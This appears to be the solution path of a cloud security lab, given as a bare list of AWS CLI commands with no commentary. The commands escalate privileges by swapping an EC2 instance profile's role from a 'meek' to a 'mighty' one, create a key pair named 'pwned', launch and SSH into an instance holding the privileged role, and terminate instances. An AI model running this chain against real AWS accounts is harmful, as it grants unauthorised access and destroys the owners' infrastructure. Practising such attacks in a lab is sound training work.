`aws configure --profile alec`

`aws --profile alec --region eu-central-1 ec2 describe-instances`

`aws --profile alec --region eu-central-1 iam list-instance-profiles`

`aws --profile alec --region eu-central-1 iam list-roles`

`aws --profile alec --region eu-central-1 iam remove-role-from-instance-profile --instance-profile-name ec2-instance-profile-ec2_profiles_<generatedID> --role-name ec2-meek-role-ec2_profiles_<generatedID>`

`aws --profile alec --region eu-central-1 iam add-role-to-instance-profile --instance-profile-name ec2-instance-profile-ec2_profiles_<generatedID> --role-name ec2-mighty-role-ec2_profiles_<generatedID>`

`aws --profile alec --region eu-central-1 ec2 create-key-pair --key-name pwned --query 'KeyMaterial' --output text > pwned.pem`

`chmod 400 pwned.pem`

`aws --profile alec --region eu-central-1 ec2 describe-subnets`

`aws --profile alec --region eu-central-1 ec2 describe-security-groups`

`aws --profile alec --region eu-central-1 ec2 run-instances --image-id ami-0a313d6098716f372 --instance-type t2.micro --iam-instance-profile Arn=<instanceProfileArn> --key-name pwned --subnet-id <subnetId> --security-group-ids <securityGroupId>`

`ssh -i pwned.pem ubuntu@<instancePublicDNSName>`

`sudo apt-get update`

`sudo apt-get install awscli`

`aws ec2 describe-instances --region us-east-1`

`aws ec2 terminate-instances --instance-ids <instanceId> --region us-east-1`
